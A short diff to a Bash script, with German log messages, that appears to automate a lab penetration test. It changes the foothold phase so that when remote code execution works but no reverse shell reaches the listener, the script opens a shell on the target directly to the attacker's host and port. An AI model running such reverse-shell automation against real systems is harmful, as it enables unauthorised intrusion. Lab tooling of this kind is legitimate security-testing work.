@@ -73,10 +73,18 @@ phase_foothold() {
         fh="shell-da"
         state_set 40 LAB_FOOTHOLD "shell-da"
       else
-        fh="rce-ohne-shell"
-        state_set 40 LAB_FOOTHOLD "rce-ohne-shell"
-        echo "[40] RCE lief, aber keine Shell im Listener. Log:" >&2
-        tail -8 "$listen_log" >&2 || true
+        echo "[40] RCE ohne offene Shell — starte Shell direkt im Lab-Target" | tee -a "$fh_log"
+        engage_lab_foothold_direct_shell "$lhost" "$lport" || true
+        sleep 1
+        if [[ -f "$listen_log" ]] && grep -q 'Shell von' "$listen_log"; then
+          fh="shell-da"
+          state_set 40 LAB_FOOTHOLD "shell-da"
+        else
+          fh="rce-ohne-shell"
+          state_set 40 LAB_FOOTHOLD "rce-ohne-shell"
+          echo "[40] Keine Shell im Listener. Log:" >&2
+          tail -8 "$listen_log" >&2 || true
+        fi
       fi
     else
       state_set 40 LAB_FOOTHOLD "failed"
